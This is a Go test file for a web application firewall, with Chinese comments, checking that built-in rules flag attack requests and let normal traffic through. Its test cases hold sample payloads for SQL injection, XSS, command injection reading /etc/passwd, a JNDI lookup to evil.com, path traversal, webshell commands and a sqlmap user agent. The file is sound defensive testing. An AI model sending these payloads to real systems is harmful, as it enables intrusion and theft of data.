package waf

import (
	"testing"
)

func evalOne(t *testing.T, rules []Rule, mode string, req Request) []Hit {
	t.Helper()
	e := NewEngine()
	if warns := e.Rebuild(rules, mode); len(warns) > 0 {
		t.Fatalf("规则编译失败: %v", warns)
	}
	return e.Evaluate(req)
}

func idsOf(hits []Hit) map[string]Hit {
	out := map[string]Hit{}
	for _, h := range hits {
		out[h.RuleID] = h
	}
	return out
}

func TestBuiltinDetection(t *testing.T) {
	rules := builtinRules()
	cases := []struct {
		name string
		req  Request
		want string
		neg  bool
	}{
		{
			name: "SQLi 布尔盲注",
			req:  Request{Path: `/search?q=1%27%20OR%201%3D1--`, UA: "Mozilla/5.0"},
			want: "sqli",
		},
		{
			name: "SQLi union select",
			req:  Request{Path: `/api/list?id=1%20UNION%20SELECT%20username,password%20FROM%20users`},
			want: "sqli",
		},
		{
			name: "XSS script 标签",
			req:  Request{Path: `/search?q=%3Cscript%3Ealert(1)%3C/script%3E`},
			want: "xss",
		},
		{
			name: "XSS 双重编码",
			req:  Request{Path: `/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E`},
			want: "xss",
		},
		{
			name: "命令执行拼接",
			req:  Request{Path: `/tools?host=127.0.0.1;cat%20/etc/passwd`},
			want: "rce",
		},
		{
			name: "JNDI 注入",
			req:  Request{Path: `/api?x=${jndi:ldap://evil.com/a}`},
			want: "rce",
		},
		{
			name: "路径穿越",
			req:  Request{Path: `/download?file=../../../../etc/passwd`},
			want: "lfi",
		},
		{
			name: "webshell 访问",
			req:  Request{Path: `/upload/shell.php?cmd=whoami`},
			want: "webshell",
		},
		{
			name: "扫描器 UA",
			req:  Request{Path: `/`, UA: "sqlmap/1.7.2#stable (https://sqlmap.org)"},
			want: "scanner",
		},
		{
			name: "敏感路径",
			req:  Request{Path: `/.env`},
			want: "sensitive",
		},
		// 正常流量必须零命中：WAF 误伤一次就可能丢一个真实用户
		{name: "正常搜索", req: Request{Path: `/search?q=hello%20world&page=2`}, neg: true},
		{name: "正常商品页", req: Request{Path: `/product/123?utm_source=wechat`}, neg: true},
		{name: "正常中文参数", req: Request{Path: `/list?kw=%E4%BA%91%E7%BB%B4`}, neg: true},
		{name: "正常数值参数", req: Request{Path: `/index.php?id=100&sort=desc`}, neg: true},
		{name: "curl 客户端", req: Request{Path: `/health`, UA: "curl/8.4.0"}, neg: true},
		{name: "富文本散文", req: Request{Path: `/post?content=1%3C2%20and%203%3E2`}, neg: true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hits := evalOne(t, rules, ActionBlock, c.req)
			got := idsOf(hits)
			if c.neg {
				if len(hits) != 0 {
					t.Fatalf("正常请求被误判: %+v", hits)
				}
				return
			}
			h, ok := got[c.want]
			if !ok {
				t.Fatalf("未命中 %s，实际命中 %v", c.want, keyNames(hits))
			}
			if h.Action == "" {
				t.Fatalf("命中缺少处置动作")
			}
			if h.Snippet == "" {
				t.Fatalf("命中缺少证据片段")
			}
		})
	}
}

func TestObserveModeDowngrade(t *testing.T) {
	req := Request{Path: `/search?q=1%27%20OR%201%3D1--`}
	hits := evalOne(t, builtinRules(), ActionObserve, req)
	if len(hits) == 0 {
		t.Fatal("观察模式仍应产出命中记录")
	}
	for _, h := range hits {
		if h.Action != ActionObserve {
			t.Fatalf("观察模式命中动作应为 observe，实际 %s", h.Action)
		}
	}
}

func TestRuleToggleAndCustomRule(t *testing.T) {
	rules := builtinRules()
	for i := range rules {
		if rules[i].ID == "sqli" {
			rules[i].Enabled = false
		}
	}
	req := Request{Path: `/search?q=1%27%20OR%201%3D1--`}
	if hits := evalOne(t, rules, ActionBlock, req); len(hits) != 0 {
		t.Fatalf("关闭 sqli 后不应命中: %v", keyNames(hits))
	}

	custom := Rule{ID: "custom-test", Name: "拦截特定 UA", Category: CatCustom, Severity: SevMedium,
		Action: ActionBlock, Enabled: true, Scope: []string{"ua"}, Pattern: `badbot`}
	hits := evalOne(t, []Rule{custom}, ActionBlock, Request{Path: "/", UA: "Mozilla/5.0 badbot"})
	if len(hits) != 1 || hits[0].RuleID != "custom-test" {
		t.Fatalf("自定义规则未命中: %v", keyNames(hits))
	}
}

func TestDecodeLayers(t *testing.T) {
	cases := map[string]string{
		"a%20b":            "a b",
		"%2527":            "'",
		"%253Cscript%253E": "<script>",
		"100%25":           "100%",
		"\u4e91":           "\u4e91",
		"a+b":              "a b",
	}
	for in, want := range cases {
		if got := decodeLayers(in, 3); got != want {
			t.Errorf("decodeLayers(%q)=%q want %q", in, got, want)
		}
	}
	if got := decodeEntities("&lt;script&gt;"); got != "<script>" {
		t.Errorf("decodeEntities=%q", got)
	}
}

func TestBanLadder(t *testing.T) {
	st := defaultSettings()
	normalizeSettings(&st)
	want := []int{10, 60, 1440}
	if len(st.BanLadder) != len(want) {
		t.Fatalf("阶梯未归一化: %v", st.BanLadder)
	}
	checks := map[int]int{1: want[0], 2: want[1], 3: want[2], 4: want[2], 0: want[0]}
	for n, m := range checks {
		if got := st.banMinutes(n); got != m {
			t.Errorf("第 %d 次命中封禁 %d 分钟，期望 %d", n, got, m)
		}
	}
}

func TestSensitiveActionDefaultObserve(t *testing.T) {
	rules := builtinRules()
	found := false
	for _, r := range rules {
		if r.ID == "sensitive" {
			found = true
			if r.Action != ActionObserve {
				t.Fatalf("敏感路径默认应为观察，避免一刀切误伤后台入口")
			}
		}
	}
	if !found {
		t.Fatal("缺少 sensitive 内置规则")
	}
}

func keyNames(hits []Hit) []string {
	out := make([]string, 0, len(hits))
	for _, h := range hits {
		out = append(out, h.RuleID)
	}
	return out
}
